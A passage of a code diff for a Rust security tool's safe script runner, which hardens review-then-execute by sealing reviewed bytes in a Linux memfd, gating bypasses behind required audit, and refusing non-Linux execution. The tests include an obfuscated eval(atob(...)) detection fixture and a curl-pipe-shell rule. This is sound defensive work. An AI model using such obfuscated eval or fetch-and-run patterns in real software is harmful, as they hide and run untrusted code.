@@ -1,8 +1,9 @@
-/// Safe runner — Unix only.
-/// Downloads a script, analyzes it, optionally executes it with user confirmation.
+/// Safe runner. Download/inspection mode is platform-neutral in the core; live
+/// execution is Linux-only and refuses before download on every other host.
 use std::fs;
 use std::io::{self, BufRead, Write};
 use std::path::Path;
+#[cfg(target_os = "linux")]
 use std::process::Command;
 
 use sha2::{Digest, Sha256};
@@ -31,11 +32,45 @@ pub struct RunResult {
 /// inside the OS containment capsule without `tirith-core` depending on the
 /// capsule launcher (which is async/OS-API-bound and lives in the CLI crate).
 ///
-/// Given the typed invocation, private hash-verified execution file, and bytes
-/// read back from that still-open file, run the script and return its exit code.
-/// The content-addressed cache is never passed to an executor.
-pub type ScriptExecutor =
-    Box<dyn Fn(&ScriptInvocation, &std::path::Path, &[u8]) -> Result<i32, String>>;
+/// Legacy path callback retained for downstream source compatibility. Live
+/// execution through this callback is refused because a path cannot preserve
+/// the reviewed-object identity contract; use [`VerifiedScriptExecutor`] with
+/// [`run_with_verified_executor`] instead. `--no-exec` callers may continue to
+/// construct `RunOptions` containing this field because no callback is invoked.
+pub type ScriptExecutor = Box<dyn Fn(&str, &std::path::Path) -> Result<i32, String>>;
+
+/// Additive content-bound executor used by Tirith's capsule integration. Unlike
+/// the legacy path callback, this API can receive only the runner-constructed
+/// immutable reviewed object. The legacy alias remains source-compatible but is
+/// refused for live execution.
+pub type VerifiedScriptExecutor =
+    Box<dyn for<'script> Fn(&ScriptInvocation, ReviewedScript<'script>) -> Result<i32, String>>;
+
+/// Exact bytes approved by the runner and the immutable descriptor that backs
+/// file-mode execution. Construction is private to this module: executors can
+/// read the approved bytes, and Linux executors can inherit the fully sealed
+/// descriptor, but cannot substitute a pathname selected after review.
+#[derive(Clone, Copy)]
+pub struct ReviewedScript<'a> {
+    bytes: &'a [u8],
+    #[cfg(target_os = "linux")]
+    sealed_fd: std::os::fd::RawFd,
+}
+
+impl<'a> ReviewedScript<'a> {
+    /// Bytes that completed policy analysis and were re-read from the sealed
+    /// execution object immediately before launch.
+    pub fn bytes(self) -> &'a [u8] {
+        self.bytes
+    }
+
+    /// Immutable Linux descriptor containing exactly [`Self::bytes`]. The
+    /// caller must keep this borrowed value within the executor invocation.
+    #[cfg(target_os = "linux")]
+    pub fn sealed_fd(self) -> std::os::fd::RawFd {
+        self.sealed_fd
+    }
+}
 
 /// Shell interpreters that a safe-command rewrite may explicitly preserve.
 /// These names are closed and path-free so an attacker cannot turn a generated
@@ -94,7 +129,8 @@ impl std::str::FromStr for PipeInterpreter {
 /// How the reviewed bytes reach the selected interpreter.
 #[derive(Debug, Clone, Copy, PartialEq, Eq)]
 pub enum ScriptInputMode {
-    /// Invoke the interpreter with the private file path (manual `tirith run`).
+    /// Invoke the interpreter with a fully sealed anonymous descriptor containing
+    /// the exact reviewed bytes (manual `tirith run`, Linux only).
     File,
     /// Pipe the reviewed bytes to stdin (safe rewrite of `<fetch> | <shell>`).
     Stdin,
@@ -151,11 +187,9 @@ pub struct RunOptions {
     pub no_exec: bool,
     pub interactive: bool,
     pub expected_sha256: Option<String>,
-    /// A typed stdin invocation emitted by the safe-command rewriter. When set,
-    /// the chosen interpreter and argv override the downloaded shebang.
-    pub requested_pipe_invocation: Option<RequestedPipeInvocation>,
-    /// Optional contained executor for the run step (E5). `None` keeps the
-    /// built-in uncontained execution.
+    /// Legacy path executor retained for source compatibility. It is never
+    /// invoked for live execution; a non-`None` value with execution enabled is
+    /// refused. Use [`run_with_verified_executor`] for contained execution.
     pub exec_fn: Option<ScriptExecutor>,
 }
 
@@ -189,34 +223,39 @@ struct ScriptReview {
 }
 
 struct ExecutionFile {
-    _private_dir: tempfile::TempDir,
-    file: tempfile::NamedTempFile,
+    #[cfg(target_os = "linux")]
+    sealed_file: std::fs::File,
+    #[cfg(not(target_os = "linux"))]
+    _unsupported: (),
 }
 
 impl ExecutionFile {
-    fn path(&self) -> &Path {
-        self.file.path()
+    fn read_verified(&self, expected_len: usize, expected_sha256: &str) -> Result<Vec<u8>, String> {
+        #[cfg(target_os = "linux")]
+        {
+            verify_script_seals(&self.sealed_file)?;
+            let bytes = read_open_file_at(&self.sealed_file, expected_len)?;
+            if bytes.len() != expected_len || sha256_hex(&bytes) != expected_sha256 {
+                return Err("sealed execution object digest changed before spawn".to_string());
+            }
+            Ok(bytes)
+        }
+        #[cfg(not(target_os = "linux"))]
+        {
+            let _ = (self, expected_len, expected_sha256);
+            Err("exact content-bound script execution is supported only on Linux".to_string())
+        }
     }
 
-    fn read_verified(&self, expected_len: usize, expected_sha256: &str) -> Result<Vec<u8>, String> {
-        let mut reader = self
-            .file
-            .as_file()
-            .try_clone()
-            .map_err(|e| format!("clone execution file handle: {e}"))?;
-        use std::io::{Read as _, Seek as _};
-        reader
-            .seek(std::io::SeekFrom::Start(0))
-            .map_err(|e| format!("rewind execution file: {e}"))?;
-        let mut bytes = Vec::with_capacity(expected_len);
-        reader
-            .take(expected_len as u64 + 1)
-            .read_to_end(&mut bytes)
-            .map_err(|e| format!("read execution file: {e}"))?;
-        if bytes.len() != expected_len || sha256_hex(&bytes) != expected_sha256 {
-            return Err("execution file digest changed before spawn".to_string());
+    fn reviewed<'a>(&self, bytes: &'a [u8]) -> ReviewedScript<'a> {
+        ReviewedScript {
+            bytes,
+            #[cfg(target_os = "linux")]
+            sealed_fd: {
+                use std::os::fd::AsRawFd as _;
+                self.sealed_file.as_raw_fd()
+            },
         }
-        Ok(bytes)
     }
 }
 
@@ -522,7 +561,7 @@ fn review_script_bytes(
         clipboard_source: crate::clipboard::ClipboardSourceState::Unread,
     };
     let analyzed = std::panic::catch_unwind(std::panic::AssertUnwindSafe(|| {
-        crate::engine::analyze_without_bypass_returning_policy(&ctx)
+        crate::engine::analyze_force_full_without_bypass_returning_policy(&ctx)
     }))
     .map_err(|_| "refusing execution: policy analysis did not complete".to_string())?;
     let (mut raw_verdict, policy) = analyzed;
@@ -531,13 +570,11 @@ fn review_script_bytes(
     // Exec pipeline supplies command/policy rules; add the repository's code-file
     // rules over the same UTF-8 bytes without reopening any path.
     if command_semantics {
-        raw_verdict.findings.extend(crate::rules::codefile::check(
+        append_policy_aware_codefile_findings(
+            &mut raw_verdict,
+            &policy,
             &content_str,
             logical_path.to_str(),
-        ));
-        raw_verdict.action = crate::verdict::upgraded_action_from_findings(
-            &raw_verdict.findings,
-            raw_verdict.action,
         );
     }
     raw_verdict.agent_origin = Some(crate::agent_origin::resolve_cli_origin(interactive));
@@ -560,12 +597,36 @@ fn review_script_bytes(
     })
 }
 
+fn append_policy_aware_codefile_findings(
+    verdict: &mut Verdict,
+    policy: &crate::policy::Policy,
+    content: &str,
+    logical_path: Option<&str>,
+) {
+    let first_appended = verdict.findings.len();
+    verdict
+        .findings
+        .extend(crate::rules::codefile::check(content, logical_path));
+    // These findings are produced outside engine::analyze_inner, so apply the
+    // same frozen full-policy severity overrides before deriving the raw action.
+    // Otherwise a code-file-only finding could bypass an org or repository
+    // severity override.
+    for finding in &mut verdict.findings[first_appended..] {
+        if let Some(severity) = policy.severity_override(&finding.rule_id) {
+            finding.severity = severity;
+        }
+    }
+    verdict.action =
+        crate::verdict::upgraded_action_from_findings(&verdict.findings, verdict.action);
+}
+
 fn apply_explicit_bypass(
     review: &mut ScriptReview,
     policy: &crate::policy::Policy,
     requested: bool,
     interactive: bool,
     surface_allows_bypass: bool,
+    execution_enabled: bool,
 ) -> bool {
     let policy_allows = if interactive {
         policy.allow_bypass_env
@@ -573,13 +634,10 @@ fn apply_explicit_bypass(
         policy.allow_bypass_env_noninteractive
     };
     let available = surface_allows_bypass && policy_allows;
-    let allowed = requested
-        && surface_allows_bypass
-        && if interactive {
-            policy.allow_bypass_env
-        } else {
-            policy.allow_bypass_env_noninteractive
-        };
+    let effective_is_bypassable_block = review.effective_verdict.as_ref().is_some_and(|verdict| {
+        verdict.action == Action::Block && verdict.requires_approval != Some(true)
+    });
+    let honored = requested && available && execution_enabled && effective_is_bypassable_block;
     for verdict in [
         review.raw_verdict.as_mut(),
         review.effective_verdict.as_mut(),
@@ -589,9 +647,9 @@ fn apply_explicit_bypass(
     {
         verdict.bypass_requested = requested;
         verdict.bypass_available = available;
-        verdict.bypass_honored = allowed;
+        verdict.bypass_honored = honored;
     }
-    allowed
+    honored
 }
 
 fn raw_audit_fields(review: &ScriptReview) -> Option<(String, Vec<String>)> {
@@ -619,59 +677,190 @@ fn redacted_result_verdict(review: &ScriptReview) -> Option<Verdict> {
     })
 }
 
+fn present_complete_verdict(verdict: &Verdict, writer: impl io::Write) -> Result<(), String> {
+    crate::output::write_human(verdict, false, writer).map_err(|error| {
+        format!("refusing execution because the complete verdict could not be presented: {error}")
+    })
+}
+
+fn enforce_required_bypass_audit(
+    live_bypass: bool,
+    audit_result: Result<(), String>,
+) -> Result<(), String> {
+    if live_bypass {
+        audit_result.map_err(|error| {
+            format!(
+                "refusing bypass execution because the required audit record was not persisted: {error}"
+            )
+        })
+    } else {
+        Ok(())
+    }
+}
+
 fn materialize_execution_file(
-    parent: &Path,
+    _parent: &Path,
     content: &[u8],
     expected_sha256: &str,
 ) -> Result<ExecutionFile, String> {
-    let private_dir = tempfile::Builder::new()
-        .prefix(".tirith-run-")
-        .tempdir_in(parent)
-        .map_err(|e| format!("create private execution directory: {e}"))?;
-    #[cfg(unix)]
+    #[cfg(not(target_os = "linux"))]
     {
-        use std::os::unix::fs::PermissionsExt as _;
-        fs::set_permissions(private_dir.path(), fs::Permissions::from_mode(0o700))
-            .map_err(|e| format!("secure execution directory: {e}"))?;
+        let _ = (content, expected_sha256);
+        return Err("exact content-bound script execution is supported only on Linux".to_string());
     }
-    let mut file = tempfile::NamedTempFile::new_in(private_dir.path())
-        .map_err(|e| format!("create private execution file: {e}"))?;
-    #[cfg(unix)]
+
+    #[cfg(target_os = "linux")]
     {
-        use std::os::unix::fs::PermissionsExt as _;
-        file.as_file()
-            .set_permissions(fs::Permissions::from_mode(0o600))
-            .map_err(|e| format!("secure execution file: {e}"))?;
-    }
-    file.write_all(content)
-        .map_err(|e| format!("write execution file: {e}"))?;
-    file.as_file()
-        .sync_all()
-        .map_err(|e| format!("sync execution file: {e}"))?;
-    // Verify through the still-open file description, never by reopening the
-    // pathname. A directory-entry replacement cannot influence this digest.
-    let mut verifier = file
-        .as_file()
-        .try_clone()
-        .map_err(|e| format!("clone execution file handle: {e}"))?;
-    {
-        use std::io::{Read as _, Seek as _};
-        verifier
-            .seek(std::io::SeekFrom::Start(0))
-            .map_err(|e| format!("rewind execution file: {e}"))?;
-        let mut written = Vec::with_capacity(content.len());
-        verifier
-            .take(content.len() as u64 + 1)
-            .read_to_end(&mut written)
-            .map_err(|e| format!("verify execution file: {e}"))?;
+        use std::ffi::CString;
+        use std::io::{Seek as _, SeekFrom};
+        use std::os::fd::{AsRawFd as _, FromRawFd as _};
+
+        let name = CString::new("tirith-reviewed-script").expect("static memfd label has no NUL");
+        let raw_fd = unsafe {
+            libc::memfd_create(name.as_ptr(), libc::MFD_CLOEXEC | libc::MFD_ALLOW_SEALING)
+        };
+        if raw_fd < 0 {
+            return Err(format!(
+                "create sealed execution object: {}",
+                std::io::Error::last_os_error()
+            ));
+        }
+        // SAFETY: memfd_create returned a uniquely owned descriptor.
+        let mut sealed_file = unsafe { std::fs::File::from_raw_fd(raw_fd) };
+        sealed_file
+            .write_all(content)
+            .map_err(|error| format!("write sealed execution object: {error}"))?;
+        sealed_file
+            .seek(SeekFrom::Start(0))
+            .map_err(|error| format!("rewind sealed execution object: {error}"))?;
+        let written = read_open_file_at(&sealed_file, content.len())?;
         if written.len() != content.len() || sha256_hex(&written) != expected_sha256 {
-            return Err("execution file digest changed before spawn".to_string());
+            return Err("sealed execution object digest changed while materializing".to_string());
+        }
+        if unsafe { libc::fchmod(sealed_file.as_raw_fd(), 0o400) } != 0 {
+            return Err(format!(
+                "make sealed execution object read-only: {}",
+                std::io::Error::last_os_error()
+            ));
+        }
+        let required =
+            libc::F_SEAL_SEAL | libc::F_SEAL_SHRINK | libc::F_SEAL_GROW | libc::F_SEAL_WRITE;
+        if unsafe { libc::fcntl(sealed_file.as_raw_fd(), libc::F_ADD_SEALS, required) } < 0 {
+            return Err(format!(
+                "seal reviewed script bytes: {}",
+                std::io::Error::last_os_error()
+            ));
+        }
+        verify_script_seals(&sealed_file)?;
+        Ok(ExecutionFile { sealed_file })
+    }
+}
+
+#[cfg(target_os = "linux")]
+fn read_open_file_at(file: &std::fs::File, expected_len: usize) -> Result<Vec<u8>, String> {
+    use std::os::unix::fs::FileExt as _;
+
+    let mut bytes = vec![0u8; expected_len.saturating_add(1)];
+    let mut offset = 0usize;
+    while offset < bytes.len() {
+        match file.read_at(&mut bytes[offset..], offset as u64) {
+            Ok(0) => break,
+            Ok(read) => offset += read,
+            Err(error) if error.kind() == std::io::ErrorKind::Interrupted => continue,
+            Err(error) => return Err(format!("read sealed execution object: {error}")),
         }
     }
-    Ok(ExecutionFile {
-        _private_dir: private_dir,
-        file,
-    })
+    bytes.truncate(offset);
+    Ok(bytes)
+}
+
+#[cfg(target_os = "linux")]
+fn verify_script_seals(file: &std::fs::File) -> Result<(), String> {
+    use std::os::fd::AsRawFd as _;
+
+    let seals = unsafe { libc::fcntl(file.as_raw_fd(), libc::F_GET_SEALS) };
+    if seals < 0 {
+        return Err(format!(
+            "inspect reviewed script seals: {}",
+            std::io::Error::last_os_error()
+        ));
+    }
+    let required = libc::F_SEAL_SEAL | libc::F_SEAL_SHRINK | libc::F_SEAL_GROW | libc::F_SEAL_WRITE;
+    if seals & required != required {
+        return Err("reviewed script descriptor is missing required immutable seals".to_string());
+    }
+    Ok(())
+}
+
+#[cfg(target_os = "linux")]
+fn spawn_bound_reviewed_script(
+    invocation: &ScriptInvocation,
+    reviewed_script: ReviewedScript<'_>,
+) -> Result<std::process::Child, String> {
+    use std::os::unix::process::CommandExt as _;
+
+    let program = invocation.resolved_executable.as_ref().ok_or_else(|| {
+        "script execution reached launch without a trusted interpreter identity".to_string()
+    })?;
+    program
+        .verify_identity()
+        .map_err(|error| format!("trusted script interpreter changed before launch: {error}"))?;
+    let interpreter_fd = program.bound_launch_fd().ok_or_else(|| {
+        "script execution requires a sealed content-bound interpreter descriptor".to_string()
+    })?;
+    let script_fd = reviewed_script.sealed_fd();
+    let mut command = Command::new(format!("/proc/self/fd/{interpreter_fd}"));
+    command
+        .arg0(program.invocation_path())
+        .args(&invocation.args)
+        .arg(format!("/proc/self/fd/{script_fd}"))
+        .env_clear()
+        .env("PATH", "/usr/bin:/bin")
+        .env("LANG", "C")
+        .env("LC_ALL", "C")
+        .env(
+            "TERM",
+            std::env::var_os("TERM").unwrap_or_else(|| "dumb".into()),
+        );
+    // Keep the interpreter descriptor CLOEXEC: Linux resolves the native ELF
+    // image through /proc before the successful exec closes that descriptor.
+    // Only the immutable script descriptor must survive into the interpreter so
+    // it can open the exact reviewed bytes named in argv.
+    unsafe {
+        command.pre_exec(move || {
+            if libc::fcntl(script_fd, libc::F_SETFD, 0) < 0 {
+                return Err(std::io::Error::last_os_error());
+            }
+            Ok(())
+        });
+    }
+    command.spawn().map_err(|error| format!("execute: {error}"))
+}
+
+#[cfg(target_os = "linux")]
+fn require_native_bound_interpreter(invocation: &ScriptInvocation) -> Result<(), String> {
+    let program = invocation.resolved_executable.as_ref().ok_or_else(|| {
+        "script execution requires a resolved interpreter before approval".to_string()
+    })?;
+    let fd = program.bound_launch_fd().ok_or_else(|| {
+        "script execution requires a sealed content-bound interpreter descriptor".to_string()
+    })?;
+    let mut header = [0u8; 4];
+    let read = unsafe {
+        libc::pread(
+            fd,
+            header.as_mut_ptr().cast::<libc::c_void>(),
+            header.len(),
+            0,
+        )
+    };
+    if read != header.len() as isize || header != *b"\x7fELF" {
+        return Err(format!(
+            "refusing interpreter '{}': content-bound execution requires a native ELF image",
+            invocation.interpreter
+        ));
+    }
+    Ok(())
 }
 
 /// Atomically publish downloaded bytes at their content-addressed cache path.
@@ -704,12 +893,62 @@ fn persist_cache_entry(cache_dir: &Path, cached_path: &Path, content: &[u8]) -> 
 }
 
 pub fn run(opts: RunOptions) -> Result<RunResult, String> {
+    if !opts.no_exec && opts.exec_fn.is_some() {
+        return Err(
+            "legacy path-based script executors are disabled for live execution; use the content-bound verified executor API"
+                .to_string(),
+        );
+    }
+    run_impl(opts, None, None)
+}
+
+/// Run with an additive executor that receives only the immutable reviewed
+/// script object. `RunOptions::exec_fn` must remain `None`; that legacy field is
+/// retained solely for downstream source compatibility and no longer authorizes
+/// path-based live execution.
+pub fn run_with_verified_executor(
+    opts: RunOptions,
+    executor: VerifiedScriptExecutor,
+) -> Result<RunResult, String> {
+    if opts.exec_fn.is_some() {
+        return Err("cannot combine legacy and verified script executors".to_string());
+    }
+    run_impl(opts, None, Some(&executor))
+}
+
+/// Additive verified stdin API. The typed invocation is deliberately kept out
+/// of legacy [`RunOptions`] so existing downstream struct literals remain
+/// source-compatible with the original five-field contract.
+pub fn run_with_verified_pipe_executor(
+    opts: RunOptions,
+    requested_pipe_invocation: RequestedPipeInvocation,
+    executor: VerifiedScriptExecutor,
+) -> Result<RunResult, String> {
+    if opts.exec_fn.is_some() {
+        return Err("cannot combine legacy and verified script executors".to_string());
+    }
+    run_impl(opts, Some(requested_pipe_invocation), Some(&executor))
+}
+
+fn run_impl(
+    opts: RunOptions,
+    requested_pipe_invocation: Option<RequestedPipeInvocation>,
+    verified_executor: Option<&VerifiedScriptExecutor>,
+) -> Result<RunResult, String> {
     if !opts.no_exec && !opts.interactive {
         return Err("tirith run requires an interactive terminal or --no-exec flag".to_string());
     }
-    let resolved_pipe_executable = if let Some(requested) = opts.requested_pipe_invocation.as_ref()
-    {
-        if opts.exec_fn.is_none() {
+    #[cfg(not(target_os = "linux"))]
+    if !opts.no_exec {
+        return Err(
+            "content-bound script execution is supported only on Linux: other hosts expose no \
+             complete-tree primitive for descendants that can call setsid(); refusing before \
+             download, approval, or interpreter launch"
+                .to_string(),
+        );
+    }
+    let resolved_pipe_executable = if let Some(requested) = requested_pipe_invocation.as_ref() {
+        if verified_executor.is_none() {
             return Err(
                 "a forced stdin interpreter is accepted only with fail-closed capsule execution"
                     .to_string(),
@@ -729,24 +968,19 @@ pub fn run(opts: RunOptions) -> Result<RunResult, String> {
                         requested.interpreter
                     )
                 })?;
-        Some(executable.bind_content().map_err(|error| {
-            format!(
-                "cannot bind trusted stdin interpreter '{}' before download: {error}",
-                requested.interpreter
-            )
-        })?)
+        Some(if opts.no_exec {
+            executable
+        } else {
+            executable.bind_content().map_err(|error| {
+                format!(
+                    "cannot bind trusted stdin interpreter '{}' before download: {error}",
+                    requested.interpreter
+                )
+            })?
+        })
     } else {
         None
     };
-    #[cfg(target_os = "macos")]
-    if resolved_pipe_executable.is_some() && !opts.no_exec {
-        return Err(
-            "contained stdin execution is unavailable on macOS: process groups do not own \
-             descendants that call setsid(), and macOS exposes no unprivileged complete-tree \
-             termination primitive; refusing before download or interpreter launch"
-                .to_string(),
-        );
-    }
     let purpose = if opts.no_exec {
         DownloadPurpose::SaveOnly
     } else {
@@ -764,8 +998,7 @@ pub fn run(opts: RunOptions) -> Result<RunResult, String> {
     persist_cache_entry(&cache_dir, &cached_path, &content)?;
 
     let cwd = std::env::current_dir().ok();
-    let forced_interpreter = opts
-        .requested_pipe_invocation
+    let forced_interpreter = requested_pipe_invocation
         .as_ref()
         .map(|requested| requested.interpreter.as_str());
     let mut review = review_script_bytes(
@@ -775,7 +1008,7 @@ pub fn run(opts: RunOptions) -> Result<RunResult, String> {
         cwd.as_deref(),
         forced_interpreter,
     )?;
-    let invocation = if let Some(requested) = opts.requested_pipe_invocation.as_ref() {
+    let mut invocation = if let Some(requested) = requested_pipe_invocation.as_ref() {
         ScriptInvocation {
             interpreter: requested.interpreter.as_str().to_string(),
             resolved_executable: resolved_pipe_executable.clone(),
@@ -799,25 +1032,43 @@ pub fn run(opts: RunOptions) -> Result<RunResult, String> {
             invocation.interpreter
         ));
     }
+    if !opts.no_exec && invocation.resolved_executable.is_none() {
+        let selected = crate::trusted_child::resolve_forced_interpreter(&invocation.interpreter)
+            .map_err(|error| {
+                format!(
+                    "cannot select trusted script interpreter '{}': {error}",
+                    invocation.interpreter
+                )
+            })?;
+        invocation.resolved_executable = Some(selected.bind_content().map_err(|error| {
+            format!(
+                "cannot bind trusted script interpreter '{}' before approval: {error}",
+                invocation.interpreter
+            )
+        })?);
+    }
+    #[cfg(target_os = "linux")]
+    if !opts.no_exec {
+        require_native_bound_interpreter(&invocation)?;
+    }
 
     let bypass_requested = std::env::var("TIRITH").ok().as_deref() == Some("0");
     let bypass_honored = if let Some(policy) = review.policy.clone() {
         // A generated `safe_command` is an enforcement boundary, not a user
         // request to weaken policy. Preserve `bypass_requested` for audit, but
         // make bypass unavailable for the typed stdin runner surface.
-        let surface_allows_bypass = opts.requested_pipe_invocation.is_none();
+        let surface_allows_bypass = requested_pipe_invocation.is_none();
         apply_explicit_bypass(
             &mut review,
             &policy,
             bypass_requested,
             opts.interactive,
             surface_allows_bypass,
+            !opts.no_exec,
         )
     } else {
         false
     };
-
-    let (git_repo, git_branch) = detect_git_info();
 
     let receipt = Receipt {
         url: opts.url.clone(),
@@ -842,8 +1093,10 @@ pub fn run(opts: RunOptions) -> Result<RunResult, String> {
         },
         timestamp: chrono::Utc::now().to_rfc3339(),
         cwd: cwd.as_ref().map(|p| p.display().to_string()),
-        git_repo,
-        git_branch,
+        // Receipt collection must not execute ambient PATH helpers. Git metadata
+        // stays absent until it can be derived without spawning an unbound tool.
+        git_repo: None,
+        git_branch: None,
     };
 
     if let (Some(_), Some(effective), Some(policy)) = (
@@ -854,19 +1107,32 @@ pub fn run(opts: RunOptions) -> Result<RunResult, String> {
         let (raw_action, raw_rule_ids) = raw_audit_fields(&review)
             .expect("raw verdict is present when the complete effective verdict is present");
         let audit_subject = format!("downloaded-script sha256:{sha256}");
-        let _ = crate::audit::log_verdict_with_raw(
-            effective,
-            &audit_subject,
-            None,
-            Some(uuid::Uuid::new_v4().to_string()),
-            &policy.dlp_custom_patterns,
-            Some(raw_action),
-            Some(raw_rule_ids),
-        );
+        let audit_result = if bypass_honored && !opts.no_exec {
+            crate::audit::log_verdict_with_raw_required(
+                effective,
+                &audit_subject,
+                None,
+                Some(uuid::Uuid::new_v4().to_string()),
+                &policy.dlp_custom_patterns,
+                Some(raw_action),
+                Some(raw_rule_ids),
+            )
+        } else {
+            crate::audit::log_verdict_with_raw(
+                effective,
+                &audit_subject,
+                None,
+                Some(uuid::Uuid::new_v4().to_string()),
+                &policy.dlp_custom_patterns,
+                Some(raw_action),
+                Some(raw_rule_ids),
+            )
+        };
+        enforce_required_bypass_audit(bypass_honored && !opts.no_exec, audit_result)?;
     }
     let result_verdict = redacted_result_verdict(&review);
     if let Some(display) = result_verdict.as_ref() {
-        let _ = crate::output::write_human(display, false, std::io::stderr().lock());
+        present_complete_verdict(display, std::io::stderr().lock())?;
     }
 
     if opts.no_exec {
@@ -885,7 +1151,19 @@ pub fn run(opts: RunOptions) -> Result<RunResult, String> {
         .effective_verdict
         .as_ref()
         .is_some_and(|verdict| verdict.action == Action::Block);
-    if blocked && !bypass_honored {
+    let approval_required = review
+        .effective_verdict
+        .as_ref()
+        .is_some_and(|verdict| verdict.requires_approval == Some(true));
+    // `tirith run` has no approval-completion flow. Its local y/N confirmation
+    // is not a substitute for the policy approval contract, and TIRITH=0 may not
+    // bypass it. Refuse before the generic prompt and before materialization.
+    if approval_required || (blocked && !bypass_honored) {
+        if approval_required {
+            eprintln!(
+                "tirith: execution refused: policy approval is required and this runner has no approval-completion flow"
+            );
+        }
         receipt.save().map_err(|e| format!("save receipt: {e}"))?;
         return Ok(RunResult {
             receipt,
@@ -896,7 +1174,6 @@ pub fn run(opts: RunOptions) -> Result<RunResult, String> {
             exit_code: Some(Action::Block.exit_code()),
         });
     }
-
     eprintln!(
         "tirith: downloaded {} bytes (SHA256: {})",
         content.len(),
@@ -947,44 +1224,26 @@ pub fn run(opts: RunOptions) -> Result<RunResult, String> {
     receipt.save().map_err(|e| format!("save receipt: {e}"))?;
 
     // Never execute the stable content-addressed cache path. Materialize the
-    // reviewed in-memory bytes into a fresh 0700 directory / 0600 file, keep its
-    // handle alive across execution, and verify its digest before the executor
-    // sees the path. A cache replacement therefore cannot change executed bytes.
+    // reviewed in-memory bytes into a fully sealed anonymous descriptor and
+    // verify its digest through that still-open descriptor before launch.
     let execution = materialize_execution_file(&cache_dir, &content, &sha256)?;
     let execution_bytes = execution.read_verified(content.len(), &sha256)?;
-    let exit_code = if let Some(exec) = opts.exec_fn.as_ref() {
-        Some(exec(&invocation, execution.path(), &execution_bytes)?)
+    let reviewed_script = execution.reviewed(&execution_bytes);
+    let exit_code = if let Some(exec) = verified_executor {
+        Some(exec(&invocation, reviewed_script)?)
     } else {
-        let mut command = Command::new(&invocation.interpreter);
-        match invocation.input_mode {
-            ScriptInputMode::File => {
-                command.args(&invocation.args).arg(execution.path());
-            }
-            ScriptInputMode::Stdin => {
-                // This branch is unreachable for caller-supplied forced stdin
-                // invocations (they require `exec_fn` above), but keeping the
-                // primitive correct makes the type's contract explicit.
-                command
-                    .args(&invocation.args)
-                    .stdin(std::process::Stdio::piped());
-            }
+        if invocation.input_mode != ScriptInputMode::File {
+            return Err("forced stdin execution requires the capsule executor".to_string());
         }
-        let mut child = command.spawn().map_err(|e| format!("execute: {e}"))?;
-        let write_result = if invocation.input_mode == ScriptInputMode::Stdin {
-            let mut stdin = child
-                .stdin
-                .take()
-                .ok_or_else(|| "execute: interpreter stdin was not piped".to_string())?;
-            stdin.write_all(&execution_bytes)
-        } else {
-            Ok(())
-        };
-        let status = child.wait().map_err(|e| format!("execute wait: {e}"))?;
-        if let Err(error) = write_result {
-            if error.kind() != std::io::ErrorKind::BrokenPipe {
-                return Err(format!("execute stdin: {error}"));
-            }
-        }
+        #[cfg(not(target_os = "linux"))]
+        return Err("exact content-bound script execution is supported only on Linux".to_string());
+        #[cfg(target_os = "linux")]
+        let mut child = spawn_bound_reviewed_script(&invocation, reviewed_script)?;
+        #[cfg(target_os = "linux")]
+        let waited = child.wait();
+        #[cfg(target_os = "linux")]
+        let status = waited.map_err(|e| format!("execute wait: {e}"))?;
+        #[cfg(target_os = "linux")]
         status.code()
     };
 
@@ -1066,30 +1325,11 @@ pub fn download_to_path(
     })
 }
 
-/// Detect git repo remote URL and current branch.
-fn detect_git_info() -> (Option<String>, Option<String>) {
-    let repo = Command::new("git")
-        .args(["remote", "get-url", "origin"])
-        .output()
-        .ok()
-        .filter(|o| o.status.success())
-        .and_then(|o| String::from_utf8(o.stdout).ok())
-        .map(|s| s.trim().to_string());
-
-    let branch = Command::new("git")
-        .args(["rev-parse", "--abbrev-ref", "HEAD"])
-        .output()
-        .ok()
-        .filter(|o| o.status.success())
-        .and_then(|o| String::from_utf8(o.stdout).ok())
-        .map(|s| s.trim().to_string());
-
-    (repo, branch)
-}
-
 #[cfg(test)]
 mod tests {
     use super::*;
+    #[cfg(unix)]
+    use std::process::Command;
 
     #[test]
     fn execution_transport_rejects_http_without_pin() {
@@ -1159,6 +1399,77 @@ mod tests {
     }
 
     #[test]
+    fn appended_codefile_finding_uses_frozen_policy_severity_override() {
+        let mut verdict = Verdict::allow_fast(1, crate::verdict::Timings::default());
+        let mut policy = crate::policy::Policy::default();
+        policy.severity_overrides.insert(
+            "dynamic_code_execution".to_string(),
+            crate::verdict::Severity::High,
+        );
+        append_policy_aware_codefile_findings(
+            &mut verdict,
+            &policy,
+            r#"eval(atob("SGVsbG8gV29ybGQ="))"#,
+            Some("downloaded-script.sh"),
+        );
+        let finding = verdict
+            .findings
+            .iter()
+            .find(|finding| finding.rule_id == crate::verdict::RuleId::DynamicCodeExecution)
+            .expect("code-file-only finding");
+        assert_eq!(finding.severity, crate::verdict::Severity::High);
+        assert_eq!(verdict.action, Action::Block);
+    }
+
+    #[test]
+    fn verdict_presentation_and_required_bypass_audit_fail_closed() {
+        struct FailingWriter;
+        impl std::io::Write for FailingWriter {
+            fn write(&mut self, _bytes: &[u8]) -> std::io::Result<usize> {
+                Err(std::io::Error::new(
+                    std::io::ErrorKind::BrokenPipe,
+                    "injected renderer failure",
+                ))
+            }
+
+            fn flush(&mut self) -> std::io::Result<()> {
+                Ok(())
+            }
+        }
+
+        let verdict = Verdict::from_findings(
+            vec![crate::verdict::Finding {
+                rule_id: crate::verdict::RuleId::CurlPipeShell,
+                severity: crate::verdict::Severity::High,
+                title: "fixture".to_string(),
+                description: "fixture".to_string(),
+                evidence: Vec::new(),
+                human_view: None,
+                agent_view: None,
+                mitre_id: None,
+                custom_rule_id: None,
+            }],
+            1,
+            crate::verdict::Timings::default(),
+        );
+        let render_error = present_complete_verdict(&verdict, FailingWriter)
+            .expect_err("a verdict that was not presented cannot reach confirmation");
+        assert!(
+            render_error.contains("could not be presented"),
+            "{render_error}"
+        );
+
+        let audit_error =
+            enforce_required_bypass_audit(true, Err("injected durable audit failure".to_string()))
+                .expect_err("a live bypass without durable audit cannot reach confirmation");
+        assert!(
+            audit_error.contains("required audit record"),
+            "{audit_error}"
+        );
+        assert!(enforce_required_bypass_audit(false, Err("best effort".to_string())).is_ok());
+    }
+
+    #[test]
     fn invalid_utf8_and_unsupported_interpreters_refuse_only_execution() {
         let dir = tempfile::tempdir().unwrap();
         let invalid = b"#!/bin/sh\n\xff\n";
@@ -1209,6 +1520,127 @@ mod tests {
         ));
     }
 
+    #[test]
+    fn legacy_path_executor_shape_is_retained_but_live_execution_fails_before_io() {
+        use std::sync::atomic::{AtomicBool, Ordering};
+        use std::sync::Arc;
+
